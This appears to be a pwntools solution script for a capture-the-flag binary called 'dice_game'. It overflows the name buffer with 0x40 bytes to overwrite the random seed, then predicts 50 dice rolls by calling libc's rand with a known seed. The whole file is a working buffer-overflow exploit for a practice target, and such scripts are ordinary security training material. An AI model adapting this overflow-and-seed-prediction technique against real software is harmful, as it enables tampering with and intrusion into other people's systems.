from pwn import *
from ctypes import *

p = process('dice_game')
libc = cdll.LoadLibrary('libc.so.6')
libc.srand(1)
payload = b"A"*0X40 + p64(1)

p.sendlineafter("Welcome, let me know your name: ",payload)

for i in range(50):
    rand_value = libc.rand() % 6+1
    p.sendlineafter('Give me the point(1~6):',str(rand_value))

p.interactive()